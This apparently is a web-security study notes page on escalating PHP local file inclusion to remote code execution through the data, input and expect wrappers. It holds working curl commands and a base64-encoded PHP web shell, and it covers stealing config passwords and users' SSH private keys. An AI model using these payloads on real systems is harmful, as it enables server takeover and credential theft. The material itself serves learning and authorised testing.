---
layout: default
title: File Inclusion
permalink: /Web/RCE/
---

# Remote Code Execution
One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session.
- We may find the database password in a file like `config.php`, which may match a user's password in case they re-use the same password.
- We can check the `.ssh` directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key `id_rsa` and use it to SSH into the system.
- There are ways to achieve remote code execution directly through vulnerable functions.

## Data Wrapper
However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. 
<b>Checking:
We can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version.

```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
Then:
```
echo '<base64_encoded_string>' | base64 -d | grep allow_url_include
```
Remote Code Execution:
```
echo '<?php system($_GET["cmd"]); ?>' | base64
```
Then in the url bar:
```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<base64_encoded_command>
```
Or use curl:
```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
## Input Wrapper
- We pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work.
- The input wrapper also depends on the `allow_url_include` setting, as mentioned previously.
```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
*Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)*

## Expect Wrapper
Expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server.
<b>Checking is similar as previously:
```
echo '<base64_encoded_string>' | base64 -d | grep expect
```
We may find that a configuraion keyword is used to enable the except module. Then:
```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
